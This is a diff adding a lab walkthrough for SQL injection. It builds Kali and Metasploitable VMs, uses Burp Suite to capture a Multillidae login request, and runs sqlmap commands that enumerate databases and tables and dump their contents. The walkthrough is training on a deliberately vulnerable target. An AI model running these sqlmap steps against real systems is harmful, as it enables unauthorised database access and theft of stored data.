@@ -1,0 +1,28 @@
+Install VirtualBox
+Install Kali linux and Metasploitable on VirtualBox
+Boot up both VMs and assign an IP address to Metasploitable
+ping Metasploitable's IP address in Kali VM to make sure its connected and enter it in browser
+Once connected with Metasploitable's homepage, click on Multillidae and select sql injections
+open up burp suite and enable proxy connection, connect the proxy address inside the browser as well
+turn intercept on and try to login on multillidae page with any username and password
+save the txt file from burp suite's intercept screen 
+From browser, turn back the proxy settings to default and turn off intercept
+
+Open sqlmap in kali from terminal as "kali@kali:~# sqlmap"
+
+
+COMMANDS:
+type " sqlmap -r /root/Desktop/extract.txt --dbs" hit enter
+type "0" press enter 
+
+We will get the databases and the vulnerability points and can select which database to attack by typing:
+
+The commands below will fetch us tables present inside database 
+type "sqlmap -r /root/Desktop/extract.txt -D <database name> --tables"
+type "0"
+
+To fetch information present inside those tables:
+
+type "sqlmap -r /root/Desktop/extract.txt -D <database name> -T <tablename> --dump"
+type "0"
+
